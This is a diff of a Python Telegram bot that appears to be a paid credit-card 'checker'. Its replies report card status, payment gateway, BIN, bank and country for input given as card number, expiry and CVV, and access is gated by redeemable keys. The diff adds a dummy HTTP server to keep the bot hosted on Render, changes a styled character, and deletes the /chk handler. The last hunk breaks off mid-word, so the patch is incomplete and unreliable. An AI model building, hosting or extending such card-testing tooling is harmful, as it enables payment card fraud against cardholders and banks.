@@ -8,12 +8,27 @@ import httpx
 from telegram import Update
 from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler, MessageHandler, filters
 from urllib.parse import quote
+from http.server import HTTPServer, BaseHTTPRequestHandler
+import threading
 
 # Enable logging
 logging.basicConfig(
     format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
 )
 logger = logging.getLogger(__name__)
+
+# Render / Web Service Dummy HTTP Server to prevent 'Application exited early' error
+class SimpleHandler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        self.send_response(200)
+        self.end_headers()
+        self.wfile.write(b"Bot is alive and running!")
+
+def run_server():
+    port = int(os.environ.get("PORT", 10000))
+    server = HTTPServer(("0.0.0.0", port), SimpleHandler)
+    logger.info(f"Dummy HTTP server started on port {port}")
+    server.serve_forever()
 
 TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
 OWNER_USERNAME = "@ESCROW2929"
@@ -421,7 +436,7 @@ async def process_card_string(card_line, user_full_name):
             f"🌐 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 🔥 {gate} | 💰 {price}\n"
             f"━━━━━━━━━━━━━━━━━\n"
             f"🎯💠 𝐁𝐈𝐍 𝐈𝐧𝐟𝐨\n"
-            f"𝗕𝗜𝗡 𝗜𝗻𝐟𝗼: {bin_info}\n"
+            f"𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info}\n"
             f"𝗕𝗮𝗻𝗸: {bank_info}\n"
             f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country_info}\n"
             f"━━━━━━━━━━━━━━━━━\n"
@@ -433,19 +448,4 @@ async def process_card_string(card_line, user_full_name):
         return f"❌ {card_line} ➔ API Timeout (Server took too long to respond)"
     except Exception as e:
         logger.error(f"Processing error: {str(e)}")
-        return f"❌ {card_line} ➔ API Error / Connection Failed"
-
-async def chk_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if user_id in BANNED_USERS:
-        return
-    ALL_USERS.add(user_id)
-    save_data()
-    if not has_access(user_id):
-        await update.message.reply_text("❌ Subscription expired or no key redeemed. Use /redeem <key>.")
-        return
-    if not context.args:
-        await update.message.reply_text("❌ Usage: /chk CC|MM|YY|CVV")
-        return
-    card_line = "".join(context.args)
-    user_full_name = update.effective_user.fi
+        return f"❌ {card_line} ➔ API Error / Connection F
